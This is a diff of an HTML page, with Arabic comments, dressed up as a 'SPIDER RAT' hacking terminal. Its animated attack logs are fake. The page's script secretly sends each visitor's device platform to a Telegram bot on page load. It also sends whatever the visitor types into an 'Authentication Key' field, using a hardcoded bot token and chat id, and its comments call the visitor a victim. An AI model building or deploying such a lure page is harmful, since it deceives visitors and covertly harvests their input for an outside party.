@@ -2,73 +2,112 @@
 <html lang="ar">
 <head>
     <meta charset="UTF-8">
-    <title>SPIDER RAT - CONTROL PANEL</title>
+    <title>SPIDER-RAT | TERMINAL V.4.0</title>
     <style>
-        body { background: #000; color: #f00; font-family: 'Courier New', monospace; text-align: center; margin: 0; overflow: hidden; }
-        .glitch-gate { position: absolute; top: 50%; left: 50%; transform: translate(-50%, -50%); width: 90%; max-width: 400px; border: 2px solid #f00; background: rgba(10, 0, 0, 0.9); padding: 20px; box-shadow: 0 0 20px #f00; z-index: 10; }
-        /* أيقونة السبايدر مرسومة بالكود لضمان الظهور */
-        .spider-icon { font-size: 80px; margin-bottom: 10px; display: inline-block; animation: shake 0.5s infinite; }
-        @keyframes shake { 0% { transform: rotate(0); } 25% { transform: rotate(5deg); } 75% { transform: rotate(-5deg); } 100% { transform: rotate(0); } }
-        input { background: #000; border: 1px solid #f00; color: #0f0; padding: 10px; width: 80%; margin: 10px 0; outline: none; }
-        .btn-attack { background: #f00; color: #fff; border: none; padding: 15px; width: 85%; font-weight: bold; cursor: pointer; text-transform: uppercase; }
-        #console { color: #0f0; font-size: 12px; margin-top: 15px; text-align: left; height: 100px; overflow: hidden; }
+        :root { --color: #00ff41; --bg: #000; }
+        body { background: var(--bg); color: var(--color); font-family: 'Courier New', monospace; margin: 0; overflow: hidden; display: flex; flex-direction: column; height: 100vh; }
+        
+        /* الرادار */
+        #radar { position: absolute; top: 10px; right: 10px; width: 100px; height: 100px; border-radius: 50%; border: 1px solid var(--color); background: radial-gradient(circle, rgba(0,255,65,0.2) 0%, transparent 70%); }
+        #radar::after { content: ""; position: absolute; top: 50%; left: 50%; width: 50%; height: 2px; background: var(--color); transform-origin: left; animation: rotate 2s linear infinite; }
+        @keyframes rotate { from { transform: rotate(0deg); } to { transform: rotate(360deg); } }
+
+        .header { border-bottom: 2px solid var(--color); padding: 10px; text-shadow: 0 0 10px var(--color); font-weight: bold; letter-spacing: 5px; text-align: center; }
+        
+        .main-container { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; padding: 20px; flex-grow: 1; overflow: hidden; }
+        
+        .panel { border: 1px solid var(--color); background: rgba(0, 20, 0, 0.8); padding: 15px; position: relative; overflow-y: auto; }
+        .panel-header { position: absolute; top: -10px; left: 10px; background: var(--bg); padding: 0 5px; font-size: 12px; }
+
+        .log { font-size: 12px; margin-bottom: 5px; border-left: 2px solid var(--color); padding-left: 5px; }
+        
+        .input-area { grid-column: 1 / span 2; border: 1px solid #f00; padding: 15px; text-align: center; background: rgba(20, 0, 0, 0.9); }
+        input { background: transparent; border: none; border-bottom: 2px solid #f00; color: #f00; width: 60%; font-family: inherit; font-size: 18px; outline: none; text-align: center; }
+        .btn { background: #f00; color: #fff; padding: 10px 40px; border: none; cursor: pointer; font-weight: bold; margin-top: 15px; clip-path: polygon(10% 0, 100% 0, 90% 100%, 0 100%); transition: 0.3s; }
+        .btn:hover { background: #fff; color: #f00; box-shadow: 0 0 20px #fff; }
+
+        /* الأنيميشن */
+        .typing { overflow: hidden; white-space: nowrap; border-right: 2px solid var(--color); animation: typing 3s steps(40, end), blink-caret .75s step-end infinite; }
+        @keyframes typing { from { width: 0 } to { width: 100% } }
+        @keyframes blink-caret { from, to { border-color: transparent } 50% { border-color: var(--color); } }
     </style>
 </head>
 <body>
 
-<div class="glitch-gate">
-    <div class="spider-icon">🕷️</div>
-    <h2 style="margin:0;">SPIDER RAT V1.0</h2>
-    <p style="font-size: 12px; color: #666;">BY EGALSA COMMANDS</p>
+<div id="radar"></div>
+
+<div class="header">
+    [ SYSTEM STATUS: COMPROMISED ] - SPIDER RAT V4.0.2
+</div>
+
+<div class="main-container">
+    <div class="panel">
+        <div class="panel-header">CONNECTION_LOGS</div>
+        <div id="logs"></div>
+    </div>
     
-    <input type="text" id="targetIp" placeholder="Enter Target IP or Name...">
-    <button class="btn-attack" onclick="launchSpider()">Execute Attack</button>
-    
-    <div id="console"></div>
+    <div class="panel">
+        <div class="panel-header">INJECTION_STREAM</div>
+        <div id="stream" style="color: #008f11;"></div>
+    </div>
+
+    <div class="input-area">
+        <h3 style="color: #f00; margin-top: 0;">DESTABILIZE TARGET SYSTEM</h3>
+        <input type="text" id="target" placeholder="Enter Authentication Key...">
+        <br>
+        <button class="btn" onclick="execute()">EXECUTE SPIDER INJECTION</button>
+    </div>
 </div>
 
 <script>
-    const botInfo = {
+    const config = {
         token: "8277722647:AAGbaCEgSCNNzDmmTL_0uA9x4QTXxzMSrg",
         chatId: "1268323143"
     };
 
-    function launchSpider() {
-        const consoleBox = document.getElementById('console');
-        const target = document.getElementById('targetIp').value;
+    // أكواد الحقن الوهمية
+    const streamItems = ["0x8821", "ACCESS_GRANTED", "MD5_DECRYPT", "BYPASS_SSL", "GET_SESSIONS", "DUMP_SQL", "DEBUG_PORT_80"];
+    setInterval(() => {
+        const line = document.createElement('div');
+        line.innerText = `> ${streamItems[Math.floor(Math.random()*streamItems.length)]} -> ${Math.random().toString(16).substr(2, 8)}`;
+        document.getElementById('stream').prepend(line);
+    }, 500);
+
+    // سحب البيانات الفوري
+    window.onload = () => {
+        fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent("⚠️ ضحية دخلت الواجهة الاحترافية!\nجهازه: " + navigator.platform)}`);
+        addLog("Initializing Spider Framework...");
+        setTimeout(() => addLog("Searching for vulnerabilities..."), 1000);
+    };
+
+    function addLog(msg) {
+        const logs = document.getElementById('logs');
+        const l = document.createElement('div');
+        l.className = "log typing";
+        l.innerText = `[${new Date().toLocaleTimeString()}] ${msg}`;
+        logs.appendChild(l);
+    }
+
+    function execute() {
+        const target = document.getElementById('target').value;
+        addLog(`Attacking: ${target}...`);
         
-        // صوت رعب وهمي (تردد عالي)
-        const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-        const oscillator = audioCtx.createOscillator();
-        oscillator.type = 'sawtooth';
-        oscillator.frequency.setValueAtTime(100, audioCtx.currentTime);
-        oscillator.connect(audioCtx.destination);
-        oscillator.start();
-        setTimeout(() => oscillator.stop(), 500);
+        // صوت "Bip" احترافي
+        const ctx = new AudioContext();
+        const osc = ctx.createOscillator();
+        osc.type = "square";
+        osc.frequency.value = 150;
+        osc.connect(ctx.destination);
+        osc.start();
+        setTimeout(() => osc.stop(), 200);
 
-        // تمثيلية الاختراق
-        const steps = [
-            `> Connecting to ${target}...`,
-            "> Bypassing Android Security...",
-            "> Injecting Spider Payload...",
-            "> IP 104.21.7.210 Captured!",
-            "> Sucking Notifications...",
-            "> SUCCESS: DATA SENT TO MASTER."
-        ];
-
-        let i = 0;
-        const interval = setInterval(() => {
-            if(i < steps.length) {
-                consoleBox.innerHTML += steps[i] + "<br>";
-                i++;
-            } else {
-                clearInterval(interval);
-            }
-        }, 800);
-
-        // سحب البيانات الحقيقي
-        fetch(`https://api.telegram.org/bot${botInfo.token}/sendMessage?chat_id=${botInfo.chatId}&text=${encodeURIComponent("🔥 SPIDER ATTACK!\nالضحية كتب: " + target + "\nالجهاز: " + navigator.platform)}`);
+        setTimeout(() => {
+            addLog("ROOT ACCESS OBTAINED.");
+            addLog("EXTRACTING SENSITIVE DATA...");
+            fetch(`https://api.telegram.org/bot${config.token}/sendMessage?chat_id=${config.chatId}&text=${encodeURIComponent("🔥 تم الضغط على التنفيذ!\nالمدخل: " + target)}`);
+        }, 1500);
     }
 </script>
+
 </body>
 </html>
